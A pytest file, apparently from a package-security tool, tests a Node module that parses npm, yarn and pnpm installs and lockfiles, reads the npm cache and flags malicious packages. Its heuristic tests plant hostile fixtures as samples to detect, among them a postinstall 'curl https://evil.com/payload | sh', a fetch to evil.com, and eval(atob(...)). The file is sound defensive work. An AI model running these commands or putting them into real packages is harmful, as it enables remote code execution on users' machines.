"""Tests for packagealert/languages/node.py — NodeLanguage contract."""
from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import patch

import pytest

from packagealert.languages.base import CURRENT_CONTRACT_VERSION, SandboxPaths, Snapshot
from packagealert.languages.node import NodeLanguage

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def lang() -> NodeLanguage:
    return NodeLanguage()


# ---------------------------------------------------------------------------
# Identity
# ---------------------------------------------------------------------------

def test_identity(lang: NodeLanguage) -> None:
    assert lang.name == "node"
    assert "npm" in lang.ecosystems
    assert "npm" in lang.process_names
    assert "node" in lang.process_names
    assert "yarn" in lang.process_names
    assert "pnpm" in lang.process_names
    assert lang.contract_version == CURRENT_CONTRACT_VERSION


# ---------------------------------------------------------------------------
# parse_process_install
# ---------------------------------------------------------------------------

def test_parse_npm_install(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express"])
    assert install is not None
    assert any(p.name == "express" for p in install.packages)


def test_parse_npm_install_with_version(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express@4.18.0"])
    assert install is not None
    assert any(p.name == "express" and p.version == "4.18.0" for p in install.packages)


def test_parse_scoped_package(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "@babel/core@7.0.0"])
    assert install is not None
    assert any(p.name == "@babel/core" and p.version == "7.0.0" for p in install.packages)


def test_parse_scoped_package_no_version(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "@babel/core"])
    assert install is not None
    assert any(p.name == "@babel/core" and p.version is None for p in install.packages)


def test_parse_npm_ecosystem(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express"])
    assert install is not None
    assert all(p.ecosystem == "npm" for p in install.packages)


def test_parse_npm_names_are_lowercase(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "Express@4.18.0"])
    assert install is not None
    assert all(p.name == p.name.lower() for p in install.packages)


def test_parse_args_returns_none_for_unknown_manager(lang: NodeLanguage) -> None:
    assert lang.parse_process_install(["pip", "install", "x"]) is None


def test_parse_args_returns_none_for_empty_list(lang: NodeLanguage) -> None:
    assert lang.parse_process_install([]) is None


def test_parse_npm_add(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "add", "lodash"])
    assert install is not None
    assert any(p.name == "lodash" for p in install.packages)


def test_parse_npm_multiple_packages(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express", "lodash"])
    assert install is not None
    names = {p.name for p in install.packages}
    assert "express" in names
    assert "lodash" in names


def test_parse_npm_defers_to_lockfile(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["npm", "install", "express"])
    assert install is not None
    assert install.defer_to_lockfile is True
    assert install.manager == "npm"
    assert install.lockfile_hint == "package-lock.json"


def test_parse_yarn_add(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["yarn", "add", "lodash"])
    assert install is not None
    assert install.manager == "yarn"
    assert any(p.name == "lodash" for p in install.packages)
    assert install.defer_to_lockfile is True
    assert install.lockfile_hint == "yarn.lock"


def test_parse_yarn_install(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["yarn", "install"])
    assert install is not None
    assert install.manager == "yarn"
    assert install.packages == []
    assert install.defer_to_lockfile is True


def test_parse_pnpm_add(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["pnpm", "add", "express"])
    assert install is not None
    assert install.manager == "pnpm"
    assert any(p.name == "express" for p in install.packages)
    assert install.defer_to_lockfile is True
    assert install.lockfile_hint == "pnpm-lock.yaml"


def test_parse_pnpm_install(lang: NodeLanguage) -> None:
    install = lang.parse_process_install(["pnpm", "install"])
    assert install is not None
    assert install.manager == "pnpm"
    assert install.packages == []


def test_npx_not_in_process_names(lang: NodeLanguage) -> None:
    assert "npx" not in lang.process_names


# ---------------------------------------------------------------------------
# parse_lockfile
# ---------------------------------------------------------------------------

def test_parse_package_lock(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "lockfileVersion": 2,
        "packages": {
            "": {"name": "my-app", "version": "1.0.0"},
            "node_modules/express": {"version": "4.18.0"},
            "node_modules/lodash": {"version": "4.17.21"},
        }
    }
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    names = {p.name for p in result}
    assert "express" in names
    assert "lodash" in names
    # Root entry (empty key) should be skipped
    assert "" not in names
    versions = {p.name: p.version for p in result}
    assert versions["express"] == "4.18.0"
    assert versions["lodash"] == "4.17.21"


def test_parse_lockfile_strips_node_modules_prefix(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "packages": {
            "node_modules/react": {"version": "18.2.0"},
        }
    }
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    assert any(p.name == "react" for p in result)
    # Should NOT have "node_modules/react" as a name
    assert not any("node_modules" in p.name for p in result)


def test_parse_lockfile_nested_node_modules_path(lang: NodeLanguage, tmp_path: Path) -> None:
    """v2/v3 lock files can have nested keys like node_modules/react/node_modules/scheduler.
    The name field should be used when present; otherwise the last segment after node_modules/
    is extracted so the result is a valid package name, not a path fragment."""
    lock_data = {
        "packages": {
            "node_modules/react": {"version": "18.2.0"},
            "node_modules/react/node_modules/scheduler": {
                "version": "0.23.0",
                "name": "scheduler",
            },
            # No name field — fall back to last-segment extraction
            "node_modules/jest/node_modules/jest-circus": {"version": "29.0.0"},
        }
    }
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    names = {p.name for p in result}
    assert names == {"react", "scheduler", "jest-circus"}
    assert not any("node_modules" in n for n in names)


def test_parse_lockfile_ecosystem_is_npm(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {"packages": {"node_modules/x": {"version": "1.0.0"}}}
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    assert all(p.ecosystem == "npm" for p in result)


def test_parse_lockfile_returns_empty_for_unknown_filename(lang: NodeLanguage, tmp_path: Path) -> None:
    wrong_file = tmp_path / "requirements.txt"
    wrong_file.write_text("requests==2.31.0\n")
    assert lang.parse_lockfile(wrong_file) == []


def test_parse_lockfile_returns_empty_on_invalid_json(lang: NodeLanguage, tmp_path: Path) -> None:
    bad_file = tmp_path / "package-lock.json"
    bad_file.write_text("not valid json {{{")
    assert lang.parse_lockfile(bad_file) == []


def test_parse_lockfile_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "packages": {
            "node_modules/@babel/core": {"version": "7.22.0"},
        }
    }
    lock_file = tmp_path / "package-lock.json"
    lock_file.write_text(json.dumps(lock_data))

    result = lang.parse_lockfile(lock_file)
    assert any(p.name == "@babel/core" for p in result)


def test_parse_lockfile_v1_format(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "name": "myapp",
        "lockfileVersion": 1,
        "dependencies": {
            "express": {"version": "4.18.0", "resolved": "..."},
            "lodash": {"version": "4.17.21", "resolved": "..."},
        }
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    names = {p.name for p in result}
    assert "express" in names
    assert "lodash" in names


def test_parse_package_lock_v1_per_entry_dev_flag(lang: NodeLanguage, tmp_path: Path) -> None:
    # v1 entries can carry a "dev": true flag; this takes precedence over the root
    # devDependencies list, allowing transitive dev deps to be classified correctly.
    lock_data = {
        "name": "myapp",
        "lockfileVersion": 1,
        "devDependencies": {"jest": "^29.0.0"},
        "dependencies": {
            "express": {"version": "4.18.0"},
            "jest": {"version": "29.0.0", "dev": True},
            "jest-circus": {"version": "29.0.0", "dev": True},  # transitive — not in devDependencies
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True
    assert by_name["jest-circus"].is_dev is True  # classified via per-entry flag, not devDependencies


def test_parse_package_lock_v1_prod_wins_when_in_both(lang: NodeLanguage, tmp_path: Path) -> None:
    # A package listed in root devDependencies but with "dev": false on its entry
    # (prod context wins) should be classified as prod.
    lock_data = {
        "name": "myapp",
        "lockfileVersion": 1,
        "devDependencies": {"debug": "^4.0.0"},
        "dependencies": {
            "debug": {"version": "4.3.4", "dev": False},
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    by_name = {p.name: p for p in result}
    assert by_name["debug"].is_dev is False


def test_parse_yarn_lock(lang: NodeLanguage, tmp_path: Path) -> None:
    yarn_lock = tmp_path / "yarn.lock"
    yarn_lock.write_text(
        '# yarn lockfile v1\n\n'
        'lodash@^4.17.0:\n'
        '  version "4.17.21"\n'
        '  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz"\n'
        '  integrity sha512-abc\n'
        '\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n'
        '  resolved "https://registry.yarnpkg.com/express/-/express-4.18.2.tgz"\n'
        '  integrity sha512-def\n'
    )
    result = lang.parse_lockfile(yarn_lock)
    names = {p.name for p in result}
    assert "lodash" in names
    assert "express" in names
    versions = {p.name: p.version for p in result}
    assert versions["lodash"] == "4.17.21"
    assert versions["express"] == "4.18.2"
    assert all(p.ecosystem == "npm" for p in result)


def test_parse_yarn_lock_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    yarn_lock = tmp_path / "yarn.lock"
    yarn_lock.write_text(
        '# yarn lockfile v1\n\n'
        '"@babel/core@^7.0.0":\n'
        '  version "7.22.0"\n'
        '  resolved "https://registry.yarnpkg.com/@babel/core/-/core-7.22.0.tgz"\n'
        '  integrity sha512-abc\n'
    )
    result = lang.parse_lockfile(yarn_lock)
    assert any(p.name == "@babel/core" and p.version == "7.22.0" for p in result)


def test_parse_yarn_lock_comma_separated_selectors(lang: NodeLanguage, tmp_path: Path) -> None:
    # Multiple version ranges resolving to the same package appear on one header line.
    yarn_lock = tmp_path / "yarn.lock"
    yarn_lock.write_text(
        '# yarn lockfile v1\n\n'
        '"@babel/core@^7.0.0", "@babel/core@^7.1.0":\n'
        '  version "7.22.0"\n'
        '  resolved "https://registry.yarnpkg.com/@babel/core/-/core-7.22.0.tgz"\n'
        '  integrity sha512-abc\n'
    )
    result = lang.parse_lockfile(yarn_lock)
    # Should produce exactly one entry, not two
    assert len(result) == 1
    assert result[0].name == "@babel/core"
    assert result[0].version == "7.22.0"


def test_parse_yarn_lock_empty_returns_empty(lang: NodeLanguage, tmp_path: Path) -> None:
    yarn_lock = tmp_path / "yarn.lock"
    yarn_lock.write_text("# yarn lockfile v1\n")
    result = lang.parse_lockfile(yarn_lock)
    assert result == []


def test_parse_pnpm_lock(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '6.0'\n"
        "\n"
        "packages:\n"
        "  lodash@4.17.21:\n"
        "    resolution: {integrity: sha512-abc}\n"
        "    engines: {node: '>=0'}\n"
        "  express@4.18.2:\n"
        "    resolution: {integrity: sha512-def}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    names = {p.name for p in result}
    assert "lodash" in names
    assert "express" in names
    versions = {p.name: p.version for p in result}
    assert versions["lodash"] == "4.17.21"
    assert versions["express"] == "4.18.2"
    assert all(p.ecosystem == "npm" for p in result)
    # No importers: section — dev/prod undetectable
    assert all(p.is_dev is None for p in result)


def test_parse_pnpm_lock_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '6.0'\n"
        "\n"
        "packages:\n"
        "  '@babel/core@7.22.0':\n"
        "    resolution: {integrity: sha512-abc}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    assert len(result) == 1
    assert result[0].name == "@babel/core"
    assert result[0].version == "7.22.0"
    assert result[0].ecosystem == "npm"


def test_parse_pnpm_lock_stops_at_next_section(lang: NodeLanguage, tmp_path: Path) -> None:
    # Lines in other top-level sections (e.g. "snapshots:") should not be parsed.
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '6.0'\n"
        "\n"
        "packages:\n"
        "  lodash@4.17.21:\n"
        "    resolution: {integrity: sha512-abc}\n"
        "\n"
        "snapshots:\n"
        "  notapackage@9.9.9:\n"
        "    dependencies:\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    names = {p.name for p in result}
    assert "lodash" in names
    assert "notapackage" not in names


def test_parse_pnpm_lock_empty_returns_empty(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text("lockfileVersion: '6.0'\n")
    assert lang.parse_lockfile(pnpm_lock) == []


def test_parse_pnpm_lock_v6_slash_prefix(lang: NodeLanguage, tmp_path: Path) -> None:
    # pnpm v6 lockfile uses leading '/' on package keys: /lodash@4.17.21:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: 5.4\n"
        "\n"
        "packages:\n"
        "  /lodash@4.17.21:\n"
        "    resolution: {integrity: sha512-abc}\n"
        "  /express@4.18.2:\n"
        "    resolution: {integrity: sha512-def}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    names = {p.name for p in result}
    assert "lodash" in names
    assert "express" in names
    versions = {p.name: p.version for p in result}
    assert versions["lodash"] == "4.17.21"
    assert versions["express"] == "4.18.2"


def test_parse_pnpm_lock_v6_scoped_slash_prefix(lang: NodeLanguage, tmp_path: Path) -> None:
    # pnpm v6 scoped packages: /@babel/core@7.22.0:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: 5.4\n"
        "\n"
        "packages:\n"
        "  /@babel/core@7.22.0:\n"
        "    resolution: {integrity: sha512-abc}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    assert len(result) == 1
    assert result[0].name == "@babel/core"
    assert result[0].version == "7.22.0"


def test_parse_pnpm_lock_peer_dep_suffix_stripped(lang: NodeLanguage, tmp_path: Path) -> None:
    # Keys with peer-dependency suffixes: /@babel/core@7.20.0(@types/node@18.0.0):
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: 5.4\n"
        "\n"
        "packages:\n"
        "  /@babel/core@7.20.0(@types/node@18.0.0):\n"
        "    resolution: {integrity: sha512-abc}\n"
        "  /lodash@4.17.21:\n"
        "    resolution: {integrity: sha512-def}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p.version for p in result}
    assert by_name["@babel/core"] == "7.20.0"
    assert by_name["lodash"] == "4.17.21"


# ---------------------------------------------------------------------------
# cache_paths
# ---------------------------------------------------------------------------

def test_cache_paths(lang: NodeLanguage) -> None:
    paths = lang.cache_paths()
    assert len(paths) >= 1
    assert any("npm" in str(p) for p in paths)


def test_cache_paths_returns_path_objects(lang: NodeLanguage) -> None:
    paths = lang.cache_paths()
    assert all(isinstance(p, Path) for p in paths)


def test_cache_paths_points_to_index_v5(lang: NodeLanguage) -> None:
    paths = lang.cache_paths()
    assert all("index-v5" in str(p) for p in paths)


def test_cache_paths_does_not_watch_content_v2(lang: NodeLanguage) -> None:
    paths = lang.cache_paths()
    assert not any("content-v2" in str(p) for p in paths)


def test_cache_file_globs_targets_fixed_depth(lang: NodeLanguage) -> None:
    # index-v5 entries live at exactly two bucket levels — the glob must not
    # recurse deeper (avoid classifying directories or unrelated nested paths).
    globs = lang.cache_file_globs()
    assert len(globs) == 1
    glob = globs[0]
    # Must match an entry at the two-bucket-level path
    from pathlib import PurePosixPath
    assert PurePosixPath("ab/cd/somehashfile").match(glob)
    # Must not use an open-ended recursive pattern
    assert "**" not in glob


# ---------------------------------------------------------------------------
# classify_cache_file
# ---------------------------------------------------------------------------

def _make_index_entry(tmp_path: Path, key: str, subdir: str = "ab/cd") -> Path:
    """Write a minimal npm index-v5 cache entry file."""
    d = tmp_path / subdir
    d.mkdir(parents=True, exist_ok=True)
    f = d / "entry"
    payload = json.dumps({"key": key, "integrity": "sha512-abc"})
    f.write_text(f"deadbeef\t{payload}\n")
    return f


def test_classify_cache_file_plain_package(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "lodash"
    assert result.version == "4.17.21"
    assert result.ecosystem == "npm"


def test_classify_cache_file_scoped_package_url_encoded(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/%40babel%2Fcore/-/core-7.22.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "@babel/core"
    assert result.version == "7.22.0"


def test_classify_cache_file_scoped_package_plain_url(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://registry.example.com/npm/QA/@babel/plugin-proposal-private-methods/-/plugin-proposal-private-methods-7.18.6.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "@babel/plugin-proposal-private-methods"
    assert result.version == "7.18.6"


def test_classify_cache_file_scoped_package_uppercase_encoding(lang: NodeLanguage, tmp_path: Path) -> None:
    # %2f (lowercase) instead of %2F — old manual replace() was case-sensitive and missed this
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/%40babel%2fcore/-/core-7.22.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "@babel/core"


def test_classify_cache_file_encoded_slash_in_unscoped_name_rejected(lang: NodeLanguage, tmp_path: Path) -> None:
    # 'evil%2Fpkg' decodes to 'evil/pkg' — not a valid unscoped name; must return None
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/evil%2Fpkg/-/pkg-1.0.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is None


def test_classify_cache_file_encoded_slash_in_scoped_name_extra_slash_rejected(lang: NodeLanguage, tmp_path: Path) -> None:
    # '@scope%2Fextra/pkg' decodes to '@scope/extra/pkg' — two slashes, invalid scoped name
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/%40scope%2Fextra%2Fpkg/-/pkg-1.0.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is None


def test_classify_cache_file_uses_last_line(lang: NodeLanguage, tmp_path: Path) -> None:
    d = tmp_path / "ab" / "cd"
    d.mkdir(parents=True)
    f = d / "entry"
    old_key = "make-fetch-happen:request-cache:https://registry.npmjs.org/old-pkg/-/old-pkg-1.0.0.tgz"
    new_key = "make-fetch-happen:request-cache:https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"
    f.write_text(
        f"aaa\t{json.dumps({'key': old_key})}\n"
        f"bbb\t{json.dumps({'key': new_key})}\n"
    )
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "lodash"


def test_classify_cache_file_wrong_bucket_depth_skipped(lang: NodeLanguage, tmp_path: Path) -> None:
    """Files not in exactly a two-level hex-bucket dir are rejected before any file I/O."""
    # One level deep — should be skipped
    shallow = tmp_path / "ab" / "entry"
    shallow.parent.mkdir(parents=True)
    shallow.write_text("this would parse but should never be read\n")
    assert lang.classify_cache_file(shallow) is None

    # Non-hex parent name
    non_hex = tmp_path / "requests" / "cd" / "entry"
    non_hex.parent.mkdir(parents=True)
    non_hex.write_text("irrelevant\n")
    assert lang.classify_cache_file(non_hex) is None

    # Three levels deep — still has two hex parents but is too deep to be index-v5
    too_deep = tmp_path / "ab" / "cd" / "ef" / "entry"
    too_deep.parent.mkdir(parents=True)
    too_deep.write_text("irrelevant\n")
    assert lang.classify_cache_file(too_deep) is None

    # File with an extension (e.g. a wheel or tarball in another cache)
    with_ext = tmp_path / "ab" / "cd" / "some-package.whl"
    with_ext.parent.mkdir(parents=True, exist_ok=True)
    with_ext.write_text("irrelevant\n")
    assert lang.classify_cache_file(with_ext) is None


def test_classify_cache_file_non_tgz_key_returns_none(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://registry.npmjs.org/lodash"
    f = _make_index_entry(tmp_path, key)
    assert lang.classify_cache_file(f) is None


def test_classify_cache_file_unreadable_returns_none(lang: NodeLanguage, tmp_path: Path) -> None:
    assert lang.classify_cache_file(tmp_path / "nonexistent") is None


def test_classify_cache_file_invalid_json_returns_none(lang: NodeLanguage, tmp_path: Path) -> None:
    d = tmp_path / "ab" / "cd"
    d.mkdir(parents=True)
    f = d / "entry"
    f.write_text("deadbeef\tnot-json\n")
    assert lang.classify_cache_file(f) is None


def test_classify_cache_file_private_registry(lang: NodeLanguage, tmp_path: Path) -> None:
    key = "make-fetch-happen:request-cache:https://mycompany.jfrog.io/npm/read-pkg/-/read-pkg-1.1.0.tgz"
    f = _make_index_entry(tmp_path, key)
    result = lang.classify_cache_file(f)
    assert result is not None
    assert result.name == "read-pkg"
    assert result.version == "1.1.0"


# ---------------------------------------------------------------------------
# heuristics — async
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_heuristic_detects_install_script(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node ./setup.js"
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    heuristics = lang.heuristics()
    assert heuristics
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "install_script" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_curl_in_script(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://evil.com/payload | sh"
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    signal_names = {s.name for s in signals}
    assert "install_script" in signal_names
    assert "curl_in_script" in signal_names


@pytest.mark.asyncio
async def test_heuristic_detects_powershell_in_script(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "powershell.exe -Command \"Invoke-Expression\""
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "powershell_in_script" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_eval(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {"name": "evil-pkg", "version": "1.0.0"}
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("eval(atob('aGVsbG8='));\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "eval_usage" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_child_process(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {"name": "evil-pkg", "version": "1.0.0"}
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("const cp = require('child_process');\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "child_process" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_network_access(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {"name": "evil-pkg", "version": "1.0.0"}
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("fetch('https://evil.com/data');\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "network_access" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_detects_credential_access(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {"name": "evil-pkg", "version": "1.0.0"}
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("const home = process.env.HOME;\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert any(s.name == "credential_access" for s in signals)


@pytest.mark.asyncio
async def test_heuristic_clean_package_no_signals(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_json = {
        "name": "clean-pkg",
        "version": "1.0.0",
        "scripts": {
            "test": "jest"
        }
    }
    (tmp_path / "package.json").write_text(json.dumps(pkg_json))
    (tmp_path / "index.js").write_text("module.exports = { hello: () => 'world' };\n")
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert signals == []


@pytest.mark.asyncio
async def test_heuristic_no_package_json_no_signals(lang: NodeLanguage, tmp_path: Path) -> None:
    # Directory without package.json should yield no signals
    heuristics = lang.heuristics()
    signals = []
    for h in heuristics:
        signals.extend(await h.analyze(tmp_path))
    assert signals == []


# ---------------------------------------------------------------------------
# lockfile_patterns
# ---------------------------------------------------------------------------

def test_lockfile_patterns(lang: NodeLanguage) -> None:
    patterns = lang.lockfile_patterns()
    assert "package-lock.json" in patterns
    assert "yarn.lock" in patterns
    assert "pnpm-lock.yaml" in patterns


# ---------------------------------------------------------------------------
# detect_installed_packages
# ---------------------------------------------------------------------------

def test_detect_installed_mocked_npm_ls(lang: NodeLanguage, tmp_path: Path) -> None:
    # Create node_modules so the guard passes
    (tmp_path / "node_modules").mkdir()

    fake_output = json.dumps({
        "dependencies": {
            "express": {"version": "4.18.0"},
            "lodash": {"version": "4.17.21"},
        }
    }).encode()

    with patch("subprocess.check_output", return_value=fake_output):
        result = lang.detect_installed_packages(tmp_path)

    names = {p.name for p in result}
    assert "express" in names
    assert "lodash" in names
    versions = {p.name: p.version for p in result}
    assert versions["express"] == "4.18.0"


def test_detect_installed_fallback_node_modules(lang: NodeLanguage, tmp_path: Path) -> None:
    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()

    # Create a non-scoped package
    express_dir = node_modules / "express"
    express_dir.mkdir()
    (express_dir / "package.json").write_text(
        json.dumps({"name": "express", "version": "4.18.0"})
    )

    # Create a scoped package
    babel_scope = node_modules / "@babel"
    babel_scope.mkdir()
    babel_core = babel_scope / "core"
    babel_core.mkdir()
    (babel_core / "package.json").write_text(
        json.dumps({"name": "@babel/core", "version": "7.22.0"})
    )

    with patch("subprocess.check_output", side_effect=Exception("npm not found")):
        result = lang.detect_installed_packages(tmp_path)

    names = {p.name for p in result}
    assert "express" in names
    assert "@babel/core" in names


def test_detect_installed_empty_if_no_node_modules(lang: NodeLanguage, tmp_path: Path) -> None:
    result = lang.detect_installed_packages(tmp_path)
    assert result == []


def test_detect_installed_ecosystem_is_npm(lang: NodeLanguage, tmp_path: Path) -> None:
    (tmp_path / "node_modules").mkdir()
    fake_output = json.dumps({
        "dependencies": {"express": {"version": "4.18.0"}}
    }).encode()

    with patch("subprocess.check_output", return_value=fake_output):
        result = lang.detect_installed_packages(tmp_path)

    assert all(p.ecosystem == "npm" for p in result)


# ---------------------------------------------------------------------------
# sandbox_paths
# ---------------------------------------------------------------------------

def test_sandbox_paths(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert isinstance(sp, SandboxPaths)
    assert isinstance(sp.read_only, list)
    assert isinstance(sp.writable, list)
    assert isinstance(sp.hidden, list)


def test_sandbox_paths_writable_has_npm(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert any(".npm" in str(p) for p in sp.writable)


def test_sandbox_paths_hidden_has_ssh(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert any(".ssh" in str(p) for p in sp.hidden)


def test_sandbox_paths_hidden_has_aws(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert any(".aws" in str(p) for p in sp.hidden)


def test_sandbox_paths_readonly_has_nvm(lang: NodeLanguage) -> None:
    sp = lang.sandbox_paths()
    assert any(".nvm" in str(p) for p in sp.read_only)


def test_sandbox_env_returns_node_specific_vars(lang: NodeLanguage) -> None:
    env = lang.sandbox_env()
    assert isinstance(env, list)
    assert "NPM_CONFIG_REGISTRY" in env
    assert "NPM_CONFIG_CACHE" in env
    assert "NVM_DIR" in env
    assert "NODE_PATH" in env


def test_sandbox_env_does_not_include_common_vars(lang: NodeLanguage) -> None:
    env = lang.sandbox_env()
    assert "PATH" not in env
    assert "HOME" not in env
    assert "HTTP_PROXY" not in env


# ---------------------------------------------------------------------------
# snapshot / detect_post_install
# ---------------------------------------------------------------------------

def test_snapshot_empty_dir(lang: NodeLanguage, tmp_path: Path) -> None:
    snap = lang.snapshot(tmp_path)
    assert isinstance(snap, Snapshot)
    assert snap.data == {}


def test_snapshot_and_detect_post_install(lang: NodeLanguage, tmp_path: Path) -> None:
    # Take a pre-snapshot (no node_modules)
    before = lang.snapshot(tmp_path)

    # "Install" a package by creating node_modules/express/package.json
    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    express_dir = node_modules / "express"
    express_dir.mkdir()
    (express_dir / "package.json").write_text(
        json.dumps({"name": "express", "version": "4.18.0"})
    )

